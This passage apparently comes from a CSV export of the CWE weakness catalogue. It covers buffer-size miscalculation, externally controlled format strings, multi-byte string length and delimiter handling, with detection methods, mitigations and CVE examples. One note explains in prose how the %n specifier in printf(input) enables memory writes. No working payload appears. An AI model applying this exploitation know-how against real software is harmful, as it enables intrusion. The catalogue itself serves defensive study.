overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0327::REFERENCE:CVE-2003-0345:DESCRIPTION:Product allows remote attackers to cause a denial of service and possibly execute arbitrary code via an SMB packet that specifies a smaller buffer length than is required.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0345::REFERENCE:CVE-2004-0430:DESCRIPTION:Server allows remote attackers to execute arbitrary code via a LoginExt packet for a Cleartext Password User Authentication Method (UAM) request with a PathName argument that includes an AFPName type string that is longer than the associated length field.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0430::REFERENCE:CVE-2005-0064:DESCRIPTION:PDF viewer allows remote attackers to execute arbitrary code via a PDF file with a large /Encrypt /Length keyLength value.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0064::REFERENCE:CVE-2004-0413:DESCRIPTION:SVN client trusts the length field of SVN protocol URL strings, which allows remote attackers to cause a denial of service and possibly execute arbitrary code via an integer overflow that leads to a heap-based buffer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0413::REFERENCE:CVE-2004-0940:DESCRIPTION:Is effectively an accidental double increment of a counter that prevents a length check conditional from exiting a loop.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0940::REFERENCE:CVE-2002-1235:DESCRIPTION:Length field of a request not verified.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1235::REFERENCE:CVE-2005-3184:DESCRIPTION:Buffer overflow by modifying a length value.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3184::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Length Parameter Inconsistency::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted Input to Command::\",::47::,\"::TYPE:Relationship:NOTE:This probably overlaps other categories including zero-length issues.::\",\n131,\"Incorrect Calculation of Buffer Size\",Base,Draft,\"The product does not correctly calculate the size to be used when allocating a buffer, which could lead to a buffer overflow.\",\"\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1340:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Availability:SCOPE:Confidentiality:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Read Memory:IMPACT:Modify Memory:NOTE:If the incorrect calculation is used in the context of memory allocation, then the software may create a buffer that is smaller or larger than expected. If the allocated buffer is smaller than expected, this could lead to an out-of-bounds read or write (CWE-119), possibly causing a crash, allowing arbitrary code execution, or exposing sensitive data.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis generally does not account for environmental considerations when reporting potential errors in buffer calculations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.:EFFECTIVENESS:High::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. Specifically, manual static analysis is useful for evaluating the correctness of allocation calculations. This can be useful for detecting overflow conditions (CWE-190) or similar weaknesses that might have serious security impacts on the program.:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer Cost effective for partial coverage: Source Code Quality Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:When allocating a buffer for the purpose of transforming, converting, or encoding an input, allocate enough memory to handle the largest possible encoding. For example, in a routine that converts & characters to &amp; for HTML entity encoding, the output buffer needs to be at least 5 times as large as the input buffer.::PHASE:Implementation:DESCRIPTION:Understand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, not-a-number calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7] Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:DESCRIPTION:When processing structured incoming data containing a size field followed by raw data, identify and resolve any inconsistencies between the size field and the actual size of the data (CWE-130).::PHASE:Implementation:DESCRIPTION:When allocating memory that uses sentinels to mark the end of a data structure - such as NUL bytes in strings - make sure you also include the sentinel in your calculation of the total amount of memory that must be allocated.::PHASE:Implementation:DESCRIPTION:Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.:EFFECTIVENESS:Moderate::PHASE:Implementation:DESCRIPTION:Use sizeof() on the appropriate data type to avoid CWE-467.::PHASE:Implementation:DESCRIPTION:Use the appropriate type for the desired action. For example, in C/C++, only use unsigned types for values that could never be negative, such as height, width, or other numbers related to quantity. This will simplify validation and will reduce surprises related to unexpected casting.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Use libraries or frameworks that make it easier to handle numbers without unexpected consequences, or buffer allocation routines that automatically track buffer size. Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::\",\"::REFERENCE:CVE-2020-17087:DESCRIPTION:Chain: integer truncation (CWE-197) causes small buffer allocation (CWE-131) leading to out-of-bounds write (CWE-787) in kernel pool, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-17087::REFERENCE:CVE-2004-1363:DESCRIPTION:substitution overflow: buffer overflow using environment variables that are expanded after the length check is performed:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1363::REFERENCE:CVE-2004-0747:DESCRIPTION:substitution overflow: buffer overflow using expansion of environment variables:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0747::REFERENCE:CVE-2005-2103:DESCRIPTION:substitution overflow: buffer overflow using a large number of substitution strings:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2103::REFERENCE:CVE-2005-3120:DESCRIPTION:transformation overflow: product adds extra escape characters to incoming data, but does not account for them in the buffer length:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3120::REFERENCE:CVE-2003-0899:DESCRIPTION:transformation overflow: buffer overflow when expanding > to &gt;, etc.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0899::REFERENCE:CVE-2001-0334:DESCRIPTION:expansion overflow: buffer overflow using wildcards:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0334::REFERENCE:CVE-2001-0248:DESCRIPTION:expansion overflow: long pathname + glob = overflow:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0248::REFERENCE:CVE-2001-0249:DESCRIPTION:expansion overflow: long pathname + glob = overflow:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0249::REFERENCE:CVE-2002-0184:DESCRIPTION:special characters in argument are not properly expanded:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0184::REFERENCE:CVE-2004-0434:DESCRIPTION:small length value leads to heap overflow:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0434::REFERENCE:CVE-2002-1347:DESCRIPTION:multiple variants:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1347::REFERENCE:CVE-2005-0490:DESCRIPTION:needs closer investigation, but probably expansion-based:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0490::REFERENCE:CVE-2004-0940:DESCRIPTION:needs closer investigation, but probably expansion-based:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0940::REFERENCE:CVE-2008-0599:DESCRIPTION:Chain: Language interpreter calculates wrong buffer size (CWE-131) by using size = ptr ? X : Y instead of size = (ptr ? X : Y) expression.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0599::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Other length calculation error::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT30-C:ENTRY NAME:Ensure that unsigned integer operations do not wrap:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM35-C:ENTRY NAME:Allocate sufficient memory for an object:MAPPING FIT:CWE More Abstract::\",::100::47::,\"::TYPE:Maintenance:NOTE:This is a broad category. Some examples include: simple math errors, incorrectly updating parallel counters, not accounting for size differences when transforming one input to another format (e.g. URL canonicalization or other transformation that can generate a result that's larger than the original input, i.e. expansion). This level of detail is rarely available in public reports, so it is difficult to find good examples.::TYPE:Maintenance:NOTE:This weakness may be a composite or a chain. It also may contain layering or perspective differences. This issue may be associated with many different types of incorrect calculations (CWE-682), although the integer overflow (CWE-190) is probably the most prevalent. This can be primary to resource consumption problems (CWE-400), including uncontrolled memory allocation (CWE-789). However, its relationship with out-of-bounds buffer access (CWE-119) must also be considered.::\",\n134,\"Use of Externally-Controlled Format String\",Base,Draft,\"The product uses a function that accepts a format string as an argument, but the format string originates from an external source.\",\"When an attacker can modify an externally-controlled format string, this can lead to buffer overflows, denial of service, or data representation problems. It should be noted that in some circumstances, such as internationalization, the set of format strings is externally controlled by design. If the source of these format strings is trusted (e.g. only contained in library files that are only modifiable by the system administrator), then the external control might not itself pose a vulnerability.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:123:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:Perl:LANGUAGE PREVALENCE:Rarely::,\"\",\"\",\"::PHASE:Implementation:NOTE:The programmer rarely intends for a format string to be externally-controlled at all. This weakness is frequently introduced in code that constructs log messages, where a constant format string is omitted.::PHASE:Implementation:NOTE:In cases such as localization and internationalization, the language-specific message repositories could be an avenue for exploitation, but the format string issue would be resultant, since attacker control of those repositories would also allow modification of message length, format, and content.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:Format string problems allow for information disclosure which can severely simplify exploitation of the program.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:NOTE:Format string problems can result in the execution of arbitrary code.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.::METHOD:Black Box:DESCRIPTION:Since format strings often occur in rarely-occurring erroneous conditions (e.g. for error message logging), they can be difficult to detect using black box methods. It is highly likely that many latent issues exist in executables that do not have associated source code (or equivalent source.:EFFECTIVENESS:Limited::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis Cost effective for partial coverage: Binary / Bytecode simple extractor - strings, ELF readers, etc.:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer Cost effective for partial coverage: Warning Flags:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:Choose a language that is not subject to this flaw.::PHASE:Implementation:DESCRIPTION:Ensure that all format string functions are passed a static string which cannot be controlled by the user, and that the proper number of arguments are always sent to that function as well. If at all possible, use functions that do not support the %n operator in format strings. [REF-116] [REF-117]::PHASE:Build and Compilation:DESCRIPTION:Run compilers and linkers with high warning levels, since they may detect incorrect usage.::\",\"::REFERENCE:CVE-2002-1825:DESCRIPTION:format string in Perl program:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1825::REFERENCE:CVE-2001-0717:DESCRIPTION:format string in bad call to syslog function:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0717::REFERENCE:CVE-2002-0573:DESCRIPTION:format string in bad call to syslog function:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0573::REFERENCE:CVE-2002-1788:DESCRIPTION:format strings in NNTP server responses:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1788::REFERENCE:CVE-2006-2480:DESCRIPTION:Format string vulnerability exploited by triggering errors or warnings, as demonstrated via format string specifiers in a .bmp filename.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2480::REFERENCE:CVE-2007-2027:DESCRIPTION:Chain: untrusted search path enabling resultant format string by loading malicious internationalization messages:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2027::\",::Logging::Error Handling::String Processing::,::Memory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Format string vulnerability::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Format String::TAXONOMY NAME:CLASP:ENTRY NAME:Format string problem::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO30-C:ENTRY NAME:Exclude user input from format strings:MAPPING FIT:Exact::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO47-C:ENTRY NAME:Use valid format strings:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:6:ENTRY NAME:Format String::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS06-J:ENTRY NAME:Exclude user input from format strings::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:IDS30-PL:ENTRY NAME:Exclude user input from format strings:MAPPING FIT:Exact::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-134::\",::135::67::,\"::TYPE:Applicable Platform:NOTE:This weakness is possible in any programming language that support format strings.::TYPE:Other:NOTE:While Format String vulnerabilities typically fall under the Buffer Overflow category, technically they are not overflowed buffers. The Format String vulnerability is fairly new (circa 1999) and stems from the fact that there is no realistic way for a function that takes a variable number of arguments to determine just how many arguments were passed in. The most common functions that take a variable number of arguments, including C-runtime functions, are the printf() family of calls. The Format String problem appears in a number of ways. A *printf() call without a format specifier is dangerous and can be exploited. For example, printf(input); is exploitable, while printf(y, input); is not exploitable in that context. The result of the first call, used incorrectly, allows for an attacker to be able to peek at stack memory since the input string will be used as the format specifier. The attacker can stuff the input string with format specifiers and begin reading stack values, since the remaining parameters will be pulled from the stack. Worst case, this improper use may give away enough control to allow an arbitrary value (or values in the case of an exploit program) to be written into the memory of the running program. Frequently targeted entities are file names, process names, identifiers. Format string problems are a classic C/C++ issue that are now rare due to the ease of discovery. One main reason format string vulnerabilities can be exploited is due to the %n operator. The %n operator will write the number of characters, which have been printed by the format string therefore far, to the memory pointed to by its argument. Through skilled creation of a format string, a malicious user may use values on the stack to create a write-what-where condition. Once this is achieved, they can execute arbitrary code. Other operators can be used as well; for example, a %9999s operator could also trigger a buffer overflow, or when used in file-formatting functions like fprintf, it can generate a much larger output than intended.::TYPE:Research Gap:NOTE:Format string issues are under-studied for languages other than C. Memory or disk consumption, control flow or variable alteration, and data corruption may result from format string exploitation in applications written in other languages such as Perl, PHP, Python, etc.::\",\n135,\"Incorrect Calculation of Multi-Byte String Length\",Base,Draft,\"The product does not correctly calculate the length of strings that can contain wide or multi-byte characters.\",\"\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:There are several ways in which improper string length checking may result in an exploitable condition. All of these, however, involve the introduction of buffer overflow conditions in order to reach an exploitable state. The first of these issues takes place when the output of a wide or multi-byte character string, string-length function is used as a size for the allocation of memory. While this will result in an output of the number of characters in the string, note that the characters are most likely not a single byte, as they are with standard character strings. So, using the size returned as the size sent to new or malloc and copying the string to this newly allocated memory will result in a buffer overflow. Another common way these strings are misused involves the mixing of standard string and wide or multi-byte string functions on a single string. Invariably, this mismatched information will result in the creation of a possibly exploitable buffer overflow condition.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:This weakness may lead to a buffer overflow. Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. This can often be used to subvert any other security service.::SCOPE:Availability:SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):NOTE:Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:In the case of an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffer's position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Always verify the length of the string unit character.::PHASE:Implementation:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use length computing functions (e.g. strlen, wcslen, etc.) appropriately with their equivalent type (e.g.: byte, wchar_t, etc.)::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Improper string length checking::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO10-J:ENTRY NAME:Ensure the array is filled when using read() to fill an array::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP10:ENTRY NAME:Incorrect Buffer Length Computation::\",,\"\",\n140,\"Improper Neutralization of Delimiters\",Base,Draft,\"The product does not neutralize or incorrectly neutralizes delimiters.\",\"\",::NATURE:ChildOf:CWE ID:138:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Developers should anticipate that delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2003-0307:DESCRIPTION:Attacker inserts field separator into input to specify admin privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0307::REFERENCE:CVE-2000-0293:DESCRIPTION:Multiple internal space, insufficient quoting - program does not use proper delimiter between values.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0293::REFERENCE:CVE-2001-0527:DESCRIPTION:Attacker inserts carriage returns and | field separator characters to add new user/privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0527::REFERENCE:CVE-2002-0267:DESCRIPTION:Linebreak in field of PHP script allows admin privileges when written to data file.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0267::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Delimiter Problems::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::15::,\"\","
  },
  "doc-a7a00af9ff1e821deb6d946095af07b8": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n178,\"Improper Handling of Case Sensitivity\",Base,Incomplete,\"The product does not properly account for differences in case sensitivity when accessing or determining the properties of a resource, leading to inconsistent results.\",\"Improperly handled case sensitive data can lead to several possible consequences, including: case-insensitive passwords reducing the size of the key space, making brute force attacks easier bypassing filters or access controls using alternate names multiple interpretation errors using alternate names.\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:706:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:433:VIEW ID:1000::NATURE:CanPrecede:CWE ID:289:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2000-0499:DESCRIPTION:Application server allows attackers to bypass execution of a jsp page and read the source code using an upper case JSP extension in the request.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0499::REFERENCE:CVE-2000-0497:DESCRIPTION:The server is case sensitive, so filetype handlers treat .jsp and .JSP as different extensions. JSP source code may be read because .JSP defaults to the filetype 